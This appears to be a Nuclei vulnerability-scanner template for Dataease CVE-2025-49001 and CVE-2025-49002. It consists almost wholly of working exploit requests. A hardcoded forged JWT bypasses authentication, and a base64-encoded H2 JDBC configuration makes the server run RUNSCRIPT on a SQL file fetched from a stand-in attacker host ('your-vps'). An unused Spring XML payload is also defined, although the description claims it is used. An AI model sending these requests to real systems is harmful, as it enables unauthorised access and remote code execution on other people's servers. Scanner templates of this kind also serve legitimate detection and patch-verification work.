id: dataease-cve-2025-49001-49002

info:
  name: Dataease Multiple Vulnerabilities (CVE-2025-49001, CVE-2025-49002)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for vulnerabilities in Dataease including JWT authentication bypass (CVE-2025-49001) and H2 database remote code execution (CVE-2025-49002).
    It evaluates both access to sensitive endpoints and the exploitation of XML deserialization using crafted payloads.
  tags: dataease,jwt,rce,h2

variables:
  crafted_token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8"
  malicious_xml: |
    <?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="
         http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

        <bean class="java.net.InetAddress" factory-method="getByName">
                <constructor-arg value="http://dnslog"/>
        </bean>
    </beans>

http:
  - raw:
      - |
        GET /de2api/user/info HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: application/json, text/plain, */*
        Connection: close
        out_auth_platform: default
        X-DE-TOKEN: {{crafted_token}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "userId"
          - "organizationId"
        part: body

  - raw:
      - |
        POST /de2api/datasource/validate HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br, zstd
        sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
        Accept: application/json, text/plain, */*
        X-DE-TOKEN: {{crafted_token}}
        Accept-Language: zh-CN
        Sec-Fetch-Dest: empty
        sec-ch-ua-mobile: ?0
        Sec-Fetch-Site: same-origin
        sec-ch-ua-platform: "Windows"
        Content-Type: application/json
        Sec-Fetch-Mode: cors

        {
            "id": "",
            "name": "11",
            "description": "",
            "type": "h2",
            "apiConfiguration": [],
            "paramsConfiguration": [],
            "enableDataFill": false,
            "configuration": "eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0ZGI7VFJBQ0VfTEVWRUxfU1lTVEVNX09VVD0zO2luaXQ9UlVuU0NSSVBUIEZST00gJ2h0dHA6Ly95b3VyLXZwczoyMzMzL3BvYy5zcWwnIiwidXJsVHlwZSI6ImpkYmNVcmwiLCJzc2hUeXBlIjoicGFzc3dvcmQiLCJleHRyYVBhcmFtcyI6IiIsInVzZXJuYW1lIjoiMTIzIiwicGFzc3dvcmQiOiIxMjMiLCJob3N0IjoiIiwiYXV0aE1ldGhvZCI6IiIsInBvcnQiOjAsImluaXRpYWxQb29sU2l6ZSI6NSwibWluUG9vbFNpemUiOjUsIm1heFBvb2xTaXplIjo1LCJxdWVyeVRpbWVvdXQiOjMwfQ=="
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "status"
          - "success"
